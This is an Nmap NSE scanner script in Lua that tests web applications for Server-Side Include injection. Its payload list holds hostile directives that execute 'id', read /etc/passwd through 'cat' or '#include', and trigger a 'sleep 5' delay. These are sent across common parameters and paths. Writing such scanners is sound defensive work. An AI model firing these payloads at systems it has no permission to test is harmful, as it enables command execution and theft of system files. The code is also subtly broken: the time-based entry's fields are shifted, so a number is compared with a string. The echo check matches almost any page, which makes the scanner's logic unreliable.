-- SSI Injection Detection
-- Tests for Server-Side Include injection vulnerabilities

local http = require("http")
local stdnse = require("stdnse")

description = [[
Tests for Server-Side Include (SSI) injection vulnerabilities
by injecting SSI directives into web application parameters.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"vuln", "intrusive", "exploit"}

portrule = function(host, port)
    return port.protocol == "tcp" and
           (port.service == "http" or port.service == "https" or
            port.number == 80 or port.number == 443 or
            port.number == 8080)
end

action = function(host, port)
    local output = {}
    local findings = {}

    local payloads = {
        {"<!--#exec cmd=\"id\" -->", "uid=%d+", "Command execution"},
        {"<!--#exec cmd=\"cat /etc/passwd\" -->", "root:", "File read"},
        {"<!--#include file=\"/etc/passwd\" -->", "root:", "File inclusion"},
        {"<!--#echo var=\"DOCUMENT_NAME\" -->", "[%w%.]+", "Variable echo"},
        {"<!--#exec cmd=\"sleep 5\" -->", nil, 5, "Time-based"},
    }

    local params = {"name", "username", "input", "text", "comment", "message"}
    local test_paths = {"/index.php", "/guestbook.php", "/comment.php"}

    for _, test_path in ipairs(test_paths) do
        for _, param in ipairs(params) do
            for _, payload in ipairs(payloads) do
                local url = test_path .. "?" .. param .. "=" .. payload[1]
                local start_time = os.time()
                local r = http.get(host.ip, port, url)
                local elapsed = os.time() - start_time

                if r and r.body then
                    if payload[2] and r.body:find(payload[2]) then
                        table.insert(findings, {
                            url = url,
                            param = param,
                            type = payload[3],
                            payload = payload[1]
                        })
                        break
                    elseif payload[4] and elapsed >= payload[4] then
                        table.insert(findings, {
                            url = url,
                            param = param,
                            type = "Time-based SSI injection",
                            payload = payload[1]
                        })
                        break
                    end
                end
            end
            if #findings > 0 then break end
        end
        if #findings > 0 then break end
    end

    if #findings > 0 then
        table.insert(output, "SSI Injection Vulnerabilities Found:")
        table.insert(output, "")
        for _, f in ipairs(findings) do
            table.insert(output, "[!] URL: " .. f.url)
            table.insert(output, "[!]   Parameter: " .. f.param)
            table.insert(output, "[!]   Type: " .. f.type)
            table.insert(output, "")
        end
        table.insert(output, "[!] CRITICAL: Allows remote code execution via SSI")
        return stdnse.format_output(true, output)
    end

    return nil
end
